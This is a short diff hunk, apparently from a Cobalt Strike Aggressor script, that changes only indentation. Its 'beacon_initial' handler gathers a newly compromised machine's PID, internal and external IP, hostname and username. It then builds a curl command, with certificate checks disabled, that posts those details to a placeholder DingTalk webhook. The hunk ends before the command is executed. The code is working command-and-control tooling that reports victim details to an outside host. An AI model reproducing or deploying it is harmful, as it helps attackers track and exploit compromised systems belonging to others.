@@ -1,12 +1,12 @@
 on beacon_initial {
-        local('$internalIP $computerName $userName $msg $pid $api @params');
-        $api = "<DINGDING WEBHOOK ADDRESS>";
-        println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));
+    local('$internalIP $computerName $userName $msg $pid $api @params');
+    $api = "<DINGDING WEBHOOK ADDRESS>";
+    println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));
     $pid = replace(beacon_info($1,"pid")," ","_");
-        $internalIP = replace(beacon_info($1,"internal")," ","_");
-        $computerName = replace(beacon_info($1,"computer")," ","_");
-        $userName = replace(beacon_info($1,"user")," ","_");
-        $externalIP = replace(beacon_info($1,"external")," ","_");
+    $internalIP = replace(beacon_info($1,"internal")," ","_");
+    $computerName = replace(beacon_info($1,"computer")," ","_");
+    $userName = replace(beacon_info($1,"user")," ","_");
+    $externalIP = replace(beacon_info($1,"external")," ","_");
     $msg = "New Beacon:: PID=" . $pid . " :: ExternalIP=" . $externalIP . " :: IntranetIP=" . $internalIP . " :: Hostname=" . $computerName . " :: UserName=" . $userName;
     $json = '{"msgtype": "text","text": {"content":"' . $msg . '"}}';
     @params = @('curl', '-k', $api, '-H', 'Content-Type: application/json', '-d', $json);
